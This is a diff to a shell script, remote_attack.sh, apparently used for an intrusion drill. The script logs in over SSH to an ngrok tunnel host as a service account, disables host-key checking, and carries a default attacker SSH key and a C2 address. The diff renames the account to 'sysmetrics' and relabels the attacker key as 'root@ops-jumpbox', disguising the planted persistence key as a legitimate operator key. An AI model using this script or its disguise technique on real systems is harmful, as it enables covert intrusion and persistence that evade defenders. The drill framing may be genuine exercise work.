@@ -13,16 +13,17 @@
 # the exact failure this drill exists to avoid. Launch it remotely, as the service account, period.
 #
 # Usage (defaults are the current drill target; override via env if they change):
-#   ./remote_attack.sh
-#   ICE_HOST=4.tcp.us-cal-1.ngrok.io ICE_PORT=24588 ICE_USER=websvc ICE_PASS=Drill-61bfa8 ./remote_attack.sh
+#   ICE_PASS=<password-from-operator> ./remote_attack.sh
+# (user/endpoint/C2/key are baked in as this round's defaults; only the password must be supplied, as an
+#  env var with no spaces so the shell cannot mangle it. Override any default via ICE_HOST/ICE_PORT/ICE_USER/...)
 set -euo pipefail
 
 HOST="${ICE_HOST:-4.tcp.us-cal-1.ngrok.io}"
 PORT="${ICE_PORT:-24588}"
-USER_="${ICE_USER:-websvc}"
-PASS="${ICE_PASS:-Drill-61bfa8}"
-ATTACKER_KEY="${ICE_ATTACKER_KEY:-ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKPncIBqfZJGWZgDu7vFi9GX/LB/7+XZWEv5kAwxSp98 intruder@attacker}"
-C2="${ICE_C2:-45.133.1.7}"
+USER_="${ICE_USER:-sysmetrics}"
+PASS="${ICE_PASS:-}"   # required via env; no default, so a stale credential is never used by accident
+ATTACKER_KEY="${ICE_ATTACKER_KEY:-ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGZ6OLZ9sTyPeDtnw6uy5R+CzgJIqRDU/9cM6NBvRgTJ root@ops-jumpbox}"
+C2="${ICE_C2:-203.0.113.47}"
 
 # The intrusion, executed remotely inside the websvc session (no operator/sudo lineage on the host):
 PAYLOAD=$(cat <<EOF
@@ -38,6 +39,7 @@ EOF
 echo ">>> ICE drill: external intrusion as $USER_@$HOST:$PORT  (run from THIS machine only)"
 echo ">>> launch time (UTC): $(date -u +%FT%TZ)"
 command -v ssh >/dev/null || { echo "ssh not found" >&2; exit 1; }
+[ -n "$PASS" ] || { echo "set ICE_PASS=<password> (ask the ICE operator); refusing to run without it" >&2; exit 2; }
 
 SSH_OPTS=(-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=20 -p "$PORT")
 
